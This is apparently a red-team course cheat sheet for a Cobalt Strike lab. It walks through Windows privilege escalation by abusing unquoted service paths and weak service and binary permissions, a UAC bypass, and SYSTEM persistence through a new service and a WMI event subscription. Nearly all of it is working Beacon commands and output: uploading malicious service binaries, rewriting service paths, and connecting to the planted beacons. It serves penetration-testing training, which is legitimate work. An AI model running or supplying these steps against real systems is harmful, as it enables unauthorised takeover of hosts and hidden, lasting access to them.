---
description: 11/15/2025
---

# Cheat Sheet Part 2

## Host Privilege Escalation

### Windows Services

#### Viewing the services installed on a machine

**We can use** <mark style="color:yellow;">services.msc</mark> **or the** <mark style="color:yellow;">sc</mark> **command-line tool (**<mark style="color:$success;">Use Command Prompt here</mark>**):**

```
C:\>sc query

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AudioEndpointBuilder
DISPLAY_NAME: Windows Audio Endpoint Builder
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

**We can also use the `Get-Service` PowerShell cmdlet:**

```
Get-Service | fl
```

### Unquoted Service Paths

{% hint style="info" %}
_An unquoted service path is where the path to the service binary is not wrapped in quotes. Why is that a problem? By itself it's not, but under specific conditions it can lead to an elevation of privilege._
{% endhint %}

#### ENUMERATION: Using WMI to pull a list of every service and the path to its executable

**Use your Beacon terminal here:**

```
run wmic service get name, pathname
```

**We can then see a list of services, the following are the ones vulnerable to the&#x20;**_**Unquoted Service Paths**_**&#x20;privilege escalation vector:**

```
VulnService1       C:\Program Files\Vulnerable Services\Service 1.exe                                         

VulnService2       "C:\Program Files\Vulnerable Services\Service 2.exe"                                       

VulnService3       "C:\Program Files\Vulnerable Services\Service 3.exe"
```

#### What makes it vulnerable?

The fact that particularly <mark style="color:$danger;">`Service 1.exe`</mark> has <mark style="color:yellow;">spaces in the path and is unquoted</mark>.

**When Windows attempts to read the path to this executable, it interprets the space as a terminator. So, it will attempt to execute the following (in order):**

1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Services\Service.exe`

_<mark style="color:yellow;">We also need to make sure that we have permissions to write into these paths.</mark>_

{% hint style="info" %}
If we can drop a binary into any of those paths, the service will execute it before the real one.
{% endhint %}

**The PowerShell `Get-Acl` cmdlet will show the permissions of various objects (including files and directories):**

```
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vulnerable Services
Owner  : BUILTIN\Administrators
Group  : DEV\Domain Users
Access : BUILTIN\Users Allow  CreateFiles, Synchronize
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:DUD:AI(A;;0x100002;;;BU)(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CII
         OID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;I
         D;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;A
         C)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)
```

#### Use SharpUp for this, it's much more streamlined&#x20;

```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath

=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.

[*] Audit mode: running an additional 1 check(s).

=== Services with Unquoted Paths ===
	Service 'VulnService1' (StartMode: Automatic) has executable 'C:\Program Files\Vulnerable Services\Service 1.exe', but 'C:\Program Files\Vulnerable Services\Service' is modifable.



[*] Completed Privesc Checks in 0 second
```

{% hint style="warning" %}
Payloads to abuse services must be specific "service binaries", because they need to interact with the Service Control Manager. When using the "Generate All Payloads" option, these have `svc` in the filename.

&#x20;

It is recommended to use TCP beacons bound to `localhost` only for privilege escalations.
{% endhint %}

#### Planting a service binary Beacon

**In the Beacon:**

```
cd C:\Program Files\Vulnerable Services

ls

upload C:\Payloads\tcp-local_x64.svc.exe # Upload Malicious Service Beacon Binary

mv tcp-local_x64.svc.exe Service.exe # Rename binary to that of the vulnerable service

ls # Confirm successful plant

run sc stop VulnService1

run sc start VulnService1
```

{% hint style="success" %}
**DURING THE EXAM/LAB:** Standard users cannot stop or start services by default, so you would usually need to wait for a computer reboot. This privilege has been granted in the lab for quality of life.
{% endhint %}

**Very important, please read:**

{% hint style="info" %}
When you start the service, you'll see its state will be `START_PENDING`.  If you then check its status with `sc query VulnService1`, you'll see it will be `STOPPED`. &#x20;

This is by design. &#x20;

You will also not see a Beacon appear in the UI automatically. &#x20;

You should see the port you used in your TCP listener configuration (in my case `4444`) is now listening on `127.0.0.1`.
{% endhint %}

**Verifying the port is open:**

```
beacon> run netstat -anp tcp
[11/16 02:36:40] [*] Tasked beacon to run: netstat -anp tcp
[11/16 02:36:43] [+] host called home, sent: 34 bytes
[11/16 02:36:44] [+] job registered with id 5
[11/16 02:36:44] [+] [job 5] received output:

Active Connections

  Proto  Local Address          Foreign Address        State

  TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING

[11/16 02:36:44] [+] job 5 completed
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

#### Restoring Service

**If desired, we can restore the service (simply delete and restart the original service):**

```
del Service.exe

run sc stop VulnService1

run sc start VulnService1
```

### Weak Service Permissions

#### Searching for Modifiable Services

**The output from `SharpUp` shows that `VulnService2` is modifiable:**

```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

=== Modifiable Services ===

	Service 'VulnService2' (State: Running, StartMode: Auto)
```

{% hint style="info" %}
You may see some exceptions produced by `SharpUp`, simply ignore these.
{% endhint %}

#### Viewing Permissions of Modifiable Services

[This](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/) PowerShell script will print which service rights we have.

```
powershell-import C:\Tools\Get-ServiceAcl.ps1

powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
```

**Output:**

```
ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
(...)
```

We see that _**all Authenticated Users**_ have `ChangeConfig`, `Start`, and `Stop` privileges over this service; meaning that we can abuse these weak permissions by changing the binary path.

{% hint style="info" %}
So instead of it running `C:\Program Files\Vulnerable Services\Service 2.exe`, we can have it run something like `C:\Temp\payload.exe`.
{% endhint %}

#### Exploiting Weak Service Permissions

1. **Validate that the current path is: `"C:\Program Files\Vulnerable Services\Service 2.exe"`:**

```
beacon> run sc qc VulnService2
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService2
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

2. **Upload a service binary and reconfigure the binary path on the vulnerable service:**

```
beacon> mkdir C:\Temp

beacon> cd C:\Temp

beacon> upload C:\Payloads\tcp-local_x64.svc.exe

beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

[SC] ChangeServiceConfig SUCCESS
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

3. **Verify that the path has been updated:**

```
beacon> run sc qc VulnService2

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService2
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Temp\tcp-local_x64.svc.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

4. **Restart the service to execute our malicious binary:**

```
run sc stop VulnService2

run sc start VulnService2

connect localhost 4444
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

**If desired, restore the previous binary path:**

```
beacon> run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
[SC] ChangeServiceConfig SUCCESS
```

{% hint style="warning" %}
&#x20;The additional set of escaped quotes is necessary to ensure that the path remains fully quoted, otherwise you could introduce a new unquoted service path vulnerability.
{% endhint %}

### Weak Service Binary Permissions

This is a slight variation of the previous vulnerability but instead of exploiting a vulnerable service, we are exploiting a vulnerable service binary itself.

```
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

This output shows that `BUILTIN\Users` have <mark style="color:$danger;">Modify</mark> privileges over <mark style="color:$danger;">`Service 3.exe`</mark>.&#x20;

<mark style="color:red;">This allows us to be able to overwrite the binary with something else!</mark>

#### Exploiting Weak Service Binary Permissions

1. **Make sure you back up the binary first:**

```
beacon> download Service 3.exe
[*] started download of C:\Program Files\Vuln Services\Service 3.exe (5120 bytes)
[*] download of Service 3.exe is complete
```

2. **Make a copy of your payload whilst renaming it to `Service3.exe` (do this locally):**

```
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
```

3. **Then attempt to upload it:**

```
beacon> upload C:\Payloads\Service 3.exe
```

{% hint style="success" %}
You may receive an error.

&#x20;This seems like an ambiguous error, but it means the file is already in use.  This makes sense, since the service is running.

```
C:\>net helpmsg 32
The process cannot access the file because it is being used by another process.
```
{% endhint %}

4. **Stop the service binary, upload, restart the service, and connect to `localhost:4444`:**

```
beacon> run sc stop VulnService3
beacon> upload C:\Payloads\Service 3.exe
beacon> ls
[*] Listing: C:\Program Files\Vuln Services\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 290kb    fil     03/03/2021 11:38:24   Service 3.exe

beacon> run sc start VulnService3
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.123.102
```

### User Account Control (UAC) Bypass

Beacon has a few built-in UAC bypasses and a few more which are provided via the [Elevate Kit](https://github.com/cobalt-strike/ElevateKit) (this has already been pre-loaded into Cobalt Strike for your convenience). &#x20;

These are exposed via the `elevate` command.

```
beacon> elevate uac-schtasks tcp-local
[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
[+] established link to child beacon: 10.10.123.102
```

**This results in:**

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

## Elevated Host Persistence

{% hint style="success" %}
This is what to do after you have elevated your privileges on a host.
{% endhint %}

we've elevated our privileges on a host, we can also add persistence mechanisms to maintain SYSTEM access.  This allows to maintain elevated access to a machine without having to exploit a vulnerability again (because it may be patched or fixed at a later date).

_**For these methods to work, you must be running in a high integrity Beacon.**_

{% hint style="warning" %}
Remember that SYSTEM processes cannot authenticate to the web proxy, so we can't use HTTP Beacons. Use P2P or DNS Beacons instead.
{% endhint %}

### Windows Services

{% hint style="danger" %}
Remember, this must be done in a `SYSTEM`-privileged session.
{% endhint %}

**We can create our own service so that we don't impact existing services and break legitimate ones:**

```
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe

beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

[*] INFO: Adding service persistence
[*] INFO: Command: C:\Windows\legit-svc.exe
[*] INFO: Command Args: 
[*] INFO: Service Name: legit-svc

[+] SUCCESS: Service persistence added
```

{% hint style="info" %}
This will create a new service in a `STOPPED` state, but with the `START_TYPE` set to `AUTO_START`. &#x20;

**This means the service won't run until the machine is rebooted.** &#x20;

When the machine starts, so will the service, and it will be waiting for a connection.
{% endhint %}

* If you try this right away without rebooting, it will not work, the system must be restarted

**Once restarted:**

```
beacon> connect localhost 4444
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### WMI Event Subscriptions

**Remember, persistence via WMI events can be achieved by leveraging the following three classes:**

1. `EventConsumer`
2. `EventFilter`
3. `FiltterToConsumerBinding`

An `EventConsumer` is the action that we want to perform, in this case, we can execute a payload.

An `EventFilter` is a trigger we can act upon.

* Any arbitrary WMI query can be used as a filter which provides practically unlimited options (e.g. process start, when a user logs in, when a USB device is inserted, or at a certain time/date)

The `FilterToConsumerBinding` simply links an `EventConsumer` and `EventFilter` together.

[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) is a PowerShell tool for building these WMI events.&#x20;

#### Uploading DNS Payload to Windows Directory & Create WMI Event Subscription

**Here, we can upload a DNS payload into the Windows directory, import `PowerLurk.ps1` and create a new WMI event subscription that will execute it whenever `notepad` is started:**

```
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

{% hint style="info" %}
Once `notepad.exe` is executing on the victim workstation, we will get a Beacon back to our TeamServer.
{% endhint %}

#### View Classes Afterwards

Open the new Beacon Terminal and use `checkin` and you will obtain the Beacon session.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

**We can use:**

```
Get-WmiEvent -Name WmiBackdoor
```
